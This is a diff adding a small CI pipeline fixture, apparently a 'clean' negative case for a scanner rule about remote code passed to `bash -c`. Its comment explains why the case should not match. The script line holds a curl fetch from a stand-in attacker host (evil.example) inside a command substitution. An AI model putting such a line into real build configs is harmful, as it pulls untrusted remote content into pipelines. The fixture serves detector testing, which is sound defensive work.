@@ -1,0 +1,8 @@
+# clean: a command substitution that sits OUTSIDE the quoted string
+# handed to `-c` is not this rule's match. `-c "echo hi"` is the whole
+# command string; the trailing `$( ... )` runs separately and its
+# output is only assigned to X, never executed by the shell `-c` reads.
+install:
+  image: alpine:3.19
+  script:
+    - bash -c "echo hi" && X=$(curl -fsSL https://evil.example/z.sh)
